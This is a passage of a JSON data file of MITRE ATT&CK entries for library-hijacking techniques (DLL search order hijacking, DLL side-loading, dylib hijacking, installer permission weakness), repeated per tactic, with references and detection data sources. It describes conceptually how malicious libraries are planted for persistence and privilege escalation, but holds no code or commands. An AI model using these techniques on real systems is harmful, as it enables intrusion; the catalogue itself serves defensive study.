Dynamic-Link Library Redirection) (Citation: Microsoft Manifests) (Citation: FireEye DLL Search Order Hijacking)<!-- raw HTML omitted --><!-- raw HTML omitted -->If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.<!-- raw HTML omitted -->Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/471.html",
        "description": "none",
        "external_id": "CAPEC-471"
      },
      {
        "source_name": "Microsoft Dynamic Link Library Search Order",
        "url": "https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN",
        "description": "Microsoft. (2018, May 31). Dynamic-Link Library Search Order. Retrieved November 30, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "OWASP Binary Planting",
        "url": "https://www.owasp.org/index.php/Binary_planting",
        "description": "OWASP. (2013, January 30). Binary planting. Retrieved June 7, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Security Advisory 2269637",
        "url": "https://docs.microsoft.com/en-us/security-updates/securityadvisories/2010/2269637",
        "description": "Microsoft. (, May 23). Microsoft Security Advisory 2269637. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Dynamic-Link Library Redirection",
        "url": "https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-redirection?redirectedfrom=MSDN",
        "description": "Microsoft. (2018, May 31). Dynamic-Link Library Redirection. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Manifests",
        "url": "https://msdn.microsoft.com/en-US/library/aa375365",
        "description": "Microsoft. (n.d.). Manifests. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye DLL Search Order Hijacking",
        "url": "https://www.fireeye.com/blog/threat-research/2010/08/dll-search-order-hijacking-revisited.html",
        "description": "Nick Harbour. (2010, September 1). DLL Search Order Hijacking Revisited. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
    "platform": "windows",
    "tid": "T1574.001",
    "technique": "DLL Search Order Hijacking",
    "tactic": "privilege-escalation",
    "datasources": "dll-monitoring|file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.<!-- raw HTML omitted --><!-- raw HTML omitted -->There are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL. (Citation: Microsoft Dynamic-Link Library Redirection) (Citation: Microsoft Manifests) (Citation: FireEye DLL Search Order Hijacking)<!-- raw HTML omitted --><!-- raw HTML omitted -->If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.<!-- raw HTML omitted -->Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/471.html",
        "description": "none",
        "external_id": "CAPEC-471"
      },
      {
        "source_name": "Microsoft Dynamic Link Library Search Order",
        "url": "https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN",
        "description": "Microsoft. (2018, May 31). Dynamic-Link Library Search Order. Retrieved November 30, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "OWASP Binary Planting",
        "url": "https://www.owasp.org/index.php/Binary_planting",
        "description": "OWASP. (2013, January 30). Binary planting. Retrieved June 7, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Security Advisory 2269637",
        "url": "https://docs.microsoft.com/en-us/security-updates/securityadvisories/2010/2269637",
        "description": "Microsoft. (, May 23). Microsoft Security Advisory 2269637. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Dynamic-Link Library Redirection",
        "url": "https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-redirection?redirectedfrom=MSDN",
        "description": "Microsoft. (2018, May 31). Dynamic-Link Library Redirection. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Manifests",
        "url": "https://msdn.microsoft.com/en-US/library/aa375365",
        "description": "Microsoft. (n.d.). Manifests. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye DLL Search Order Hijacking",
        "url": "https://www.fireeye.com/blog/threat-research/2010/08/dll-search-order-hijacking-revisited.html",
        "description": "Nick Harbour. (2010, September 1). DLL Search Order Hijacking Revisited. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
    "platform": "windows",
    "tid": "T1574.001",
    "technique": "DLL Search Order Hijacking",
    "tactic": "defense-evasion",
    "datasources": "dll-monitoring|file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.<!-- raw HTML omitted --><!-- raw HTML omitted -->There are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL. (Citation: Microsoft Dynamic-Link Library Redirection) (Citation: Microsoft Manifests) (Citation: FireEye DLL Search Order Hijacking)<!-- raw HTML omitted --><!-- raw HTML omitted -->If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.<!-- raw HTML omitted -->Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/471.html",
        "description": "none",
        "external_id": "CAPEC-471"
      },
      {
        "source_name": "Microsoft Dynamic Link Library Search Order",
        "url": "https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN",
        "description": "Microsoft. (2018, May 31). Dynamic-Link Library Search Order. Retrieved November 30, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "OWASP Binary Planting",
        "url": "https://www.owasp.org/index.php/Binary_planting",
        "description": "OWASP. (2013, January 30). Binary planting. Retrieved June 7, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Security Advisory 2269637",
        "url": "https://docs.microsoft.com/en-us/security-updates/securityadvisories/2010/2269637",
        "description": "Microsoft. (, May 23). Microsoft Security Advisory 2269637. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Dynamic-Link Library Redirection",
        "url": "https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-redirection?redirectedfrom=MSDN",
        "description": "Microsoft. (2018, May 31). Dynamic-Link Library Redirection. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Manifests",
        "url": "https://msdn.microsoft.com/en-US/library/aa375365",
        "description": "Microsoft. (n.d.). Manifests. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye DLL Search Order Hijacking",
        "url": "https://www.fireeye.com/blog/threat-research/2010/08/dll-search-order-hijacking-revisited.html",
        "description": "Nick Harbour. (2010, September 1). DLL Search Order Hijacking Revisited. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b",
    "platform": "windows",
    "tid": "T1574.002",
    "technique": "DLL Side-Loading",
    "tactic": "persistence",
    "datasources": "loaded-dlls|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the library manifest used to load DLLs. Adversaries may take advantage of vague references in the library manifest of a program by replacing a legitimate library with a malicious one, causing the operating system to load their malicious library when it is called for by the victim program.<!-- raw HTML omitted --><!-- raw HTML omitted -->Programs may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests (Citation: About Side by Side Assemblies) are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable by replacing the legitimate DLL with a malicious one.  (Citation: FireEye DLL Side-Loading)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/641.html",
        "description": "none",
        "external_id": "CAPEC-641"
      },
      {
        "source_name": "About Side by Side Assemblies",
        "url": "https://docs.microsoft.com/en-us/windows/win32/sbscs/about-side-by-side-assemblies-",
        "description": "Microsoft. (2018, May 31). About Side-by-Side Assemblies. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye DLL Side-Loading",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf",
        "description": "Amanda Steward. (2014). FireEye DLL Side-Loading: A Thorn in the Side of the Anti-Virus Industry. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b",
    "platform": "windows",
    "tid": "T1574.002",
    "technique": "DLL Side-Loading",
    "tactic": "privilege-escalation",
    "datasources": "loaded-dlls|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the library manifest used to load DLLs. Adversaries may take advantage of vague references in the library manifest of a program by replacing a legitimate library with a malicious one, causing the operating system to load their malicious library when it is called for by the victim program.<!-- raw HTML omitted --><!-- raw HTML omitted -->Programs may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests (Citation: About Side by Side Assemblies) are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable by replacing the legitimate DLL with a malicious one.  (Citation: FireEye DLL Side-Loading)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/641.html",
        "description": "none",
        "external_id": "CAPEC-641"
      },
      {
        "source_name": "About Side by Side Assemblies",
        "url": "https://docs.microsoft.com/en-us/windows/win32/sbscs/about-side-by-side-assemblies-",
        "description": "Microsoft. (2018, May 31). About Side-by-Side Assemblies. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye DLL Side-Loading",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf",
        "description": "Amanda Steward. (2014). FireEye DLL Side-Loading: A Thorn in the Side of the Anti-Virus Industry. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b",
    "platform": "windows",
    "tid": "T1574.002",
    "technique": "DLL Side-Loading",
    "tactic": "defense-evasion",
    "datasources": "loaded-dlls|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the library manifest used to load DLLs. Adversaries may take advantage of vague references in the library manifest of a program by replacing a legitimate library with a malicious one, causing the operating system to load their malicious library when it is called for by the victim program.<!-- raw HTML omitted --><!-- raw HTML omitted -->Programs may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests (Citation: About Side by Side Assemblies) are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable by replacing the legitimate DLL with a malicious one.  (Citation: FireEye DLL Side-Loading)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/641.html",
        "description": "none",
        "external_id": "CAPEC-641"
      },
      {
        "source_name": "About Side by Side Assemblies",
        "url": "https://docs.microsoft.com/en-us/windows/win32/sbscs/about-side-by-side-assemblies-",
        "description": "Microsoft. (2018, May 31). About Side-by-Side Assemblies. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye DLL Side-Loading",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf",
        "description": "Amanda Steward. (2014). FireEye DLL Side-Loading: A Thorn in the Side of the Anti-Virus Industry. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--fc742192-19e3-466c-9eb5-964a97b29490",
    "platform": "macos",
    "tid": "T1574.004",
    "technique": "Dylib Hijacking",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking ambiguous paths  used to load libraries. Adversaries may plant trojan dynamic libraries, in a directory that will be searched by the operating system before the legitimate library specified by the victim program, so that their malicious library will be loaded into the victim program instead.  MacOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths.<!-- raw HTML omitted --><!-- raw HTML omitted -->A common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself. (Citation: Writing Bad Malware for OSX) (Citation: Malware Persistence on OS X)<!-- raw HTML omitted --><!-- raw HTML omitted -->If the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/471.html",
        "description": "none",
        "external_id": "CAPEC-471"
      },
      {
        "source_name": "Writing Bad Malware for OSX",
        "url": "https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf",
        "description": "Patrick Wardle. (2015). Writing Bad @$$ Malware for OS X. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Malware Persistence on OS X",
        "url": "https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf",
        "description": "Patrick Wardle. (2015). Malware Persistence on OS X Yosemite. Retrieved July 10, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--fc742192-19e3-466c-9eb5-964a97b29490",
    "platform": "macos",
    "tid": "T1574.004",
    "technique": "Dylib Hijacking",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking ambiguous paths  used to load libraries. Adversaries may plant trojan dynamic libraries, in a directory that will be searched by the operating system before the legitimate library specified by the victim program, so that their malicious library will be loaded into the victim program instead.  MacOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths.<!-- raw HTML omitted --><!-- raw HTML omitted -->A common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself. (Citation: Writing Bad Malware for OSX) (Citation: Malware Persistence on OS X)<!-- raw HTML omitted --><!-- raw HTML omitted -->If the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/471.html",
        "description": "none",
        "external_id": "CAPEC-471"
      },
      {
        "source_name": "Writing Bad Malware for OSX",
        "url": "https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf",
        "description": "Patrick Wardle. (2015). Writing Bad @$$ Malware for OS X. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Malware Persistence on OS X",
        "url": "https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf",
        "description": "Patrick Wardle. (2015). Malware Persistence on OS X Yosemite. Retrieved July 10, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--fc742192-19e3-466c-9eb5-964a97b29490",
    "platform": "macos",
    "tid": "T1574.004",
    "technique": "Dylib Hijacking",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking ambiguous paths  used to load libraries. Adversaries may plant trojan dynamic libraries, in a directory that will be searched by the operating system before the legitimate library specified by the victim program, so that their malicious library will be loaded into the victim program instead.  MacOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths.<!-- raw HTML omitted --><!-- raw HTML omitted -->A common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself. (Citation: Writing Bad Malware for OSX) (Citation: Malware Persistence on OS X)<!-- raw HTML omitted --><!-- raw HTML omitted -->If the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/471.html",
        "description": "none",
        "external_id": "CAPEC-471"
      },
      {
        "source_name": "Writing Bad Malware for OSX",
        "url": "https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf",
        "description": "Patrick Wardle. (2015). Writing Bad @$$ Malware for OS X. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Malware Persistence on OS X",
        "url": "https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf",
        "description": "Patrick Wardle. (2015). Malware Persistence on OS X Yosemite. Retrieved July 10, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--70d81154-b187-45f9-8ec5-295d01255979",
    "platform": "windows",
    "tid": "T1574.005",
    "technique": "Executable Installer File Permissions Weakness",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-command-line-parameters",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.<!-- raw HTML omitted --><!-- raw HTML omitted -->Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <!-- raw HTML omitted -->%TEMP%<!-- raw HTML omitted --> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of <a href=\"https://attack.mitre.org/techniques/T1574/001\">DLL Search Order Hijacking</a>.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to <a href=\"https://attack.mitre.org/techniques/T1548/002\">Bypass User Account Control</a>. Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.</p>\n",
    "technique_references": [
      {
        "source_name": "mozilla_sec_adv_2012",
        "url": "https://www.mozilla.org/en-US/security/advisories/mfsa2012-98/",
        "description": "Robert Kugler. (2012, November 20). Mozilla Foundation Security Advisory 2012-98. Retrieved March 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Executable Installers are Vulnerable",
        "url": "https://seclists.org/fulldisclosure/2015/Dec/34",
        "description": "Stefan Kanthak. (2015, December 8). Executable installers are vulnerable^WEVIL (case 7): 7z*.exe allows remote code execution with escalation of privilege. Retrieved December 4, 2014.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--70d81154-b187-45f9-8ec5-295d01255979",
    "platform": "windows",
    "tid": "T1574.005",
    "technique": "Executable Installer File Permissions Weakness",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-command-line-parameters",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.<!-- raw HTML omitted --><!-- raw HTML omitted -->Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <!-- raw HTML omitted -->%TEMP%<!-- raw HTML omitted --> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of <a href=\"https://attack.mitre.org/techniques/T1574/001\">DLL Search Order Hijacking</a>.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to <a href=\"https://attack.mitre.org/techniques/T1548/002\">Bypass User Account Control</a>. Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.</p>\n",
    "technique_references": [
      {
        "source_name": "mozilla_sec_adv_2012",
        "url": "https://www.mozilla.org/en-US/security/advisories/mfsa2012-98/",
        "description": "Robert Kugler. (2012, November 20). Mozilla Foundation Security Advisory 2012-98. Retrieved March 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Executable Installers are Vulnerable",
        "url": "https://seclists.org/fulldisclosure/2015/Dec/34",
        "description": "Stefan Kanthak. (2015, December 8). Executable installers are vulnerable^WEVIL (case 7): 7z*.exe allows remote code execution with escalation of privilege. Retrieved December 4, 2014.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--70d81154-b187-45f9-8ec5-295d01255979",
    "platform": "windows",
    "tid": "T1574.005",
    "technique": "Executable Installer File Permissions Weakness",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-command-line-parameters",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.<!-- raw HTML omitted --><!-- raw HTML omitted -->Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <!-- raw HTML omitted -->%TEMP%<!-- raw HTML omitted --> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of <a href=\"https://attack.mitre.org/techniques/T1574/001\">DLL Search Order Hijacking</a>.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to <a href=\"https://attack.mitre.org/techniques/T1548/002\">Bypass User Account Control</a>. Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.</p>\n",
    "technique_references": [
      {
        "source_name": "mozilla_sec_adv_2012",
        "url": "https://www.mozilla.org/en-US/security/advisories/mfsa2012-98/",
        "description": "Robert Kugler. (2012, November 20). Mozilla Foundation Security Advisory 2012-98. Retrieved March 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Executable Installers are Vulnerable",
        "url": "https://seclists.org/fulldisclosure/2015/Dec/34",
        "description": "Stefan Kanthak. (2015, December 8). Executable installers are vulnerable^WEVIL (case 7): 7z*.exe allows remote code execution with escalation of privilege. Retrieved December 4, 2014.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--633a100c-b2c9-41bf-9be5-905c1b16c825",
    "platform": "linux",
    "tid": "T1574.006",
    "technique": "LD_PRELOAD",
    "tactic": "persistence",
    "datasources": "environment-variable|file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
